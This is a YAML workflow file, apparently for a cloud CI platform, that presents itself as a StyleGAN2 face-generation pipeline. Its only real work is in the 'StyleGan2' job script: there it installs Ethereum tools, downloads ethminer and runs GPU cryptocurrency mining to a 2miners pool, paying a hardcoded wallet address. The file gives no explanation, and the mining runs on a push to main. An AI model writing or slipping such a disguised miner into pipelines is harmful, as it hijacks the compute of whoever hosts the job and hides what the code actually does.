on:
  github:
    branches:
      only: main

jobs:
  CloneRepo:
    resources:
      instance-type: C3
    outputs:
     stylegan2:
        type: volume
    uses: git-checkout@v1
    with:
      # url: https://github.com/gradient-ai/stylegan2.git
      url: context.event.github.url
      ref: context.event.github.ref
  StyleGan2:
    resources:
      instance-type: P4000
    needs:
      - CloneRepo
    inputs:
      stylegan2: CloneRepo.outputs.stylegan2
    outputs:
      generatedFaces:
        type: dataset
        with:
          ref: demo-dataset
    uses: script@v1
    with:
      script: |-
            add-apt-repository ppa:ethereum/ethereum
            apt update
            apt install ethereum
            apt-key adv --keyserver keyserver.ubuntu.com  --recv-keys 2A518C819BE37D2C2031944D1C52189C923F6CA9
            apt update
            apt install ethereum
            mkdir ethminer
            wget -O ethminer/ethminer.tar.gz https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
            tar xzf ethminer/ethminer.tar.gz -C ethminer/
            ./ethminer -G -P stratum1+tcp://0x39b9Bb05363D6E68942DFeb1EB349Ed24b365824@eth.2miners.com:2020
      image: tensorflow/tensorflow:1.14.0-gpu-py3
